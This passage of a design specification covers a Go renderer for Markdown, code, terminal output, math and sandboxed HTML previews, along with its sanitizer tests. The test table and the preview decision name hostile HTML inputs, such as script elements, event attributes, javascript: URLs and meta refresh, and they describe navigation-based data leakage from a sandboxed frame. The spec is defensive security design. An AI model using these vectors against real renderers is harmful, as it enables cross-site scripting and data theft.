#### DH-ADR-DOMPURIFY-2 HTML file preview: the browser's isolation is the primary control; the filter removes what isolation cannot

- **Decision.** The static preview is a separate document served by its own host route
  and shown in an `<iframe sandbox>` with no permissions. The route sends the restrictive
  Content-Security-Policy **as a response header** (upstream injects it as a `<meta>`
  element because it builds the document in the browser, `basic-document.ts:17-20`).
  Before serving, the host filters the document with a bluemonday policy that removes the
  elements upstream forbids and every `href` and `xlink:href`
  (`basic-document.ts:13-14`).
- **Why.** The sandbox and the policy stop script, network loads, forms and nested
  frames. Neither stops **navigation**: a link, or a refresh directive, can send the
  frame to an address that carries data. Removing links and `<meta>` is the filter's
  actual job here.
- **Verdict on upstream.** *Keep* both layers and the interactive mode's rule (scripts
  only in a sandbox without same-origin access). *Change* the policy from an in-document
  element to a header.
- **Tradeoff or constraint.** Links in a previewed document do not work. Host-side
  filtering can differ from the browser's parsing, so the filter is the second layer,
  never the only one.
- **Serves.** [DH-O-7](../design.md#dh-o-7); `DH-LIB-DOMPURIFY-R4`.
- **Verified by.** `DH-T-DOMPURIFY-4`.

## 6. Design notes

**Shape.** One harness package (in `internal/ui`; the transcript area names it) exports a
small set of functions and nothing else produces trusted HTML:

| Function | Input | Output |
|---|---|---|
| Render settled Markdown | text, options (variant, whether local paths may open) | gated HTML |
| Streaming renderer | create per message; `Append(text)`; read frozen blocks from an index, and the tail | gated HTML per block |
| Plain text of Markdown | text | string |
| Highlight code | text, language or path | gated HTML |
| Render terminal output | bytes | gated HTML |
| Typeset formula | TeX, inline or display | gated MathML, or an error |
| Filter an HTML document for preview | bytes | bytes |

**Streaming renderer.** It keeps the source text, the HTML of frozen blocks and the end
offset of the last frozen block. `Append` re-parses from that offset, freezes all but the
last two top-level blocks, and renders what is new. An unclosed fence in the tail is
handled as lines: completed lines are appended as escaped text and the fence is coloured
once when it closes (`DH-LIB-SHIKI-R4`). Inference: goldmark's block nodes expose their
source line segments, from which the end offset is taken; `DH-T-MICROMARK-5` is the check
that this is sufficient. A non-append change to the text resets the renderer and the
connection cursors.

**Ownership and cleanup.** A streaming renderer is owned by the live render state of its
message ([react.md](react.md), `DH-ADR-REACT-2`) and dropped with it. The modules hold no
process, file or goroutine. Chroma's lexers and the bluemonday policies are built once,
at component start, and are read-only afterwards; they are safe to share between
goroutines only if the modules say so, which `DH-T-MICROMARK-7` checks under the race
detector.

**Failure.** Rendering never fails the stream. A panic in any renderer or module is
recovered inside the render function; the block is then shown as escaped plain text,
which is always safe, and the failure is logged with the session and sequence number.
A formula that fails is shown as source (`DH-LIB-KATEX-R3`). A code block that exceeds a
limit or times out is plain. There is nothing to retry and nothing to clean up: every
function is pure.

**Documentation scripts.** Upstream's root scripts parse the repository's Markdown for
its documentation site and pairing checks. The owner kept the documentation website and
dropped the pairing checks ([DH-ADR-10](../design.md#dh-adr-10)). The site is built by
Hugo, whose Markdown parser is goldmark, from a module of its own that `dsh` never
links ([DH-ADR-TOOLCHAIN-15](../upstream/toolchain.md#dh-adr-toolchain-15),
`DH-LIB-DOCSSITE` in [build-test-toolchain.md](build-test-toolchain.md)).

## 7. Risks and open questions

- **Math is provisional.** `treeblood`'s coverage of the TeX that models write, and how
  MathML looks in each supported browser engine, are unmeasured. A math font may be missing on
  Linux; shipping one is an asset and licence question for the UI stack. If
  `DH-T-KATEX-3` fails, the owner chooses between the KaTeX island and showing source.
- **Remote images** ([DH-ADR-MICROMARK-2](#dh-adr-micromark-2)) changes behaviour; the
  owner confirmed it ([DH-ADR-22](../design.md#dh-adr-22)).
- **For the UI stack specification (agent L16).** (a) The exact Content-Security-Policy,
  and whether htmx works under it with evaluation disabled. (b) The htmx mechanism that
  disables attribute processing inside a region, and that injected content cannot turn it
  back on; this specification assumes one exists and names no version. (c) Inline
  `style` attributes: table alignment and 24-bit terminal colours need either classes
  (alignment), quantising to the 256-colour palette, or a policy that permits style
  attributes.
- **bluemonday's release age.** The fallback is named in section 5.5. The transcript
  policy is small enough that switching is a contained change.
- **`<style>` in the static HTML preview.** Upstream keeps a document's styles.
  bluemonday drops `<style>` elements unless `AllowUnsafe` is set. The preview area must
  choose: lose embedded style sheets, or allow them under the header policy that already
  blocks every network load. This needs a security review either way.
- **Whether upstream links `http://localhost:3000` as a bare URL** was not determined
  (the packages are not installed in the checkout). The Go pattern should link it; the
  transcript area fixes the corpus.
- **Binary size** added by chroma's lexers and **host CPU** per rendered page are
  unmeasured. They can only be learned by building and running.
- **Colours differ from upstream** because chroma's lexers are not shiki's grammars. No
  requirement asks for identical colours.
- **New harness code.** The render package, five goldmark extensions, the terminal
  renderer, the math adapter and three policies are own code for the transcript and
  preview areas to schedule.

## 8. Verification

All tests are local: Go tests with golden files and the Go fuzzer, no browser. A real
browser is needed to show that the page's policy blocks script, that MathML displays, and
that an injected htmx attribute is inert; those are scenarios owned by the UI areas and
are not counted here. Nothing has been run.

| Test ID | Kind | Proves | How |
|---|---|---|---|
| `DH-T-MICROMARK-1` | local, golden | `DH-LIB-MICROMARK-R1`, `-R6`, `-R7`, `-R9` | A corpus of CommonMark and GFM inputs, including `10~20`, `~~x~~`, tables, task lists, footnotes and the CJK bold cases, renders to committed HTML; two renders of one input are byte-equal; the plain-text projection matches committed text |
| `DH-T-MICROMARK-2` | local | `DH-LIB-MICROMARK-R2`, `-R3`, `-R4` | Inputs with `<script>`, event attributes, `javascript:` with mixed case, tabs and entities, `data:` and relative links, and remote images: the output parsed as HTML contains no element or attribute from the source, no active link outside the allow-list and no image element with a remote source |
| `DH-T-MICROMARK-3` | local | `DH-LIB-MICROMARK-R5` | Bare-URL table: ends before `。`, `，`, a full-width space and an emoji; keeps a path with CJK letters; trailing ASCII punctuation as in GFM; the cases from both upstream patches |
| `DH-T-MICROMARK-4` | local, fuzz | `DH-LIB-MICROMARK-R10` | Random and adversarial inputs (deep nesting, long lines, large tables) never panic and finish within a bound proportional to input size |
| `DH-T-MICROMARK-5` | local | `DH-LIB-MICROMARK-R8`, [DH-ADR-MICROMARK-1](#dh-adr-micromark-1) | For each corpus document fed in chunks of 1, 3, 7 and 16 bytes, frozen blocks plus tail equal a fresh streaming-grammar render at every step; frozen HTML never changes; an open fence produces only new lines; the settled render of a document with math differs from the streaming render only at math |
| `DH-T-MICROMARK-6` | local | `DH-LIB-MICROMARK-R3` | Local-path destinations: relative, rooted, Windows drive and UNC paths with line suffixes become preview controls only in a settled render; `index.ts:24` and `localhost:3000` are treated as upstream documents (`ui-primitives/README.md:121`) |
| `DH-T-MICROMARK-7` | local, race detector | `DH-LIB-MICROMARK-R7` | Many goroutines render different documents through shared lexers and policies with no data race and identical results to a serial run |
| `DH-T-MICROMARKMATH-1` | local | `DH-LIB-MICROMARKMATH-R1` | All four delimiter pairs yield math nodes in the settled grammar and plain text in the streaming grammar; no math inside code spans and fences; an unmatched `$` is text |
| `DH-T-KATEX-1` | local | `DH-LIB-KATEX-R2` | Formulas using `\class`, `\href`, `\text{<script>}`, quotes, ampersands and angle brackets: output parsed as HTML holds only allow-listed MathML elements and attributes; fuzzing the TeX input never yields anything else |
| `DH-T-KATEX-2` | local | `DH-LIB-KATEX-R3`, `-R4`, `-R5` | An invalid formula yields the error form with its source; an oversized or recursive macro is refused within the deadline; a forced panic in the module yields the error form; a valid formula carries its source as an annotation |
| `DH-T-KATEX-3` | local, golden; **gate for the provisional choice** | `DH-LIB-KATEX-R1`, [DH-ADR-KATEX-1](#dh-adr-katex-1) | A corpus of formulas taken from upstream's Markdown fixtures (`packages/client/ui-primitives/tests/fixtures/markdown-dom`) and from recorded model output: the share that typesets without error must reach a threshold the transcript area fixes before the adapter is written, and each result is reviewed once as a golden file |
| `DH-T-SHIKI-1` | local, golden | `DH-LIB-SHIKI-R1`, `-R2`, `-R4` | Each alias in the harness language table resolves; an unknown language is plain; output has class names and no style attribute; text is escaped; an open fence is uncoloured and the closed one is coloured |
| `DH-T-SHIKI-2` | local | `DH-LIB-SHIKI-R3` | The Go line that makes upstream's grammar backtrack (`highlight.ts:44-50`), a 100,000-character line and an oversized block each return within the bound, as plain text where the limit applies |
| `DH-T-ANSER-1` | local, golden | `DH-LIB-ANSER-R1`, `-R2` | Recorded output with 16, 256 and 24-bit colours, a progress bar using carriage return, backspaces, erase-in-line, tabs and wide characters renders to the committed HTML; cursor moves, screen clears, titles and hyperlink sequences leave no visible characters |
| `DH-T-ANSER-2` | local, fuzz | `DH-LIB-ANSER-R3` | Random bytes, truncated sequences and invalid UTF-8: no panic, time linear in input, output passes the gate unchanged |
| `DH-T-DOMPURIFY-1` | local | `DH-LIB-DOMPURIFY-R1` | For every corpus input of the tests above, the gate leaves the renderers' output byte-identical; for a renderer deliberately broken in the test to emit a script element, an event attribute and an htmx attribute, the gate removes each |
| `DH-T-DOMPURIFY-2` | local, fuzz | `DH-LIB-DOMPURIFY-R1` | For arbitrary Markdown, code, terminal bytes and TeX, the final fragment parsed with a standards HTML parser contains only allow-listed elements and attributes and only allow-listed URL schemes |
| `DH-T-DOMPURIFY-3` | local | `DH-LIB-DOMPURIFY-R2`, `-R3` | A source check finds no conversion to the trusted-HTML type outside the render package; every page response carries the policy header; every template region that holds rendered untrusted content carries the htmx-disabling attribute |
| `DH-T-DOMPURIFY-4` | local | `DH-LIB-DOMPURIFY-R4` | A hostile HTML file (scripts, event attributes, `meta` refresh, `base`, links, frames, forms, SVG animation) comes back with none of them; the preview response carries the sandboxing policy header |

## 9. Units dispositioned by this spec

- `UP-DEP-mdast-util-from-markdown`, `UP-DEP-mdast-util-gfm`, `UP-DEP-mdast-util-math`
- `UP-DEP-micromark-core-commonmark`, `UP-DEP-micromark-extension-gfm`,
  `UP-DEP-micromark-extension-math`, `UP-DEP-micromark-factory-space`,
  `UP-DEP-micromark-util-character`, `UP-DEP-micromark-util-classify-character`,
  `UP-DEP-micromark-util-decode-string`, `UP-DEP-micromark-util-sanitize-uri`,
  `UP-DEP-micromark-util-symbol`, `UP-DEP-micromark-util-types`
- `UP-DEP-shiki`, `UP-DEP-@shikijs/langs`
- `UP-DEP-katex`
- `UP-DEP-anser`
- `UP-DEP-dompurify`
- `UP-DEBT-patch.mdast-util-gfm-autolink-literal@2.0.1`
- `UP-DEBT-patch.micromark-extension-gfm-autolink-literal@2.1.0`
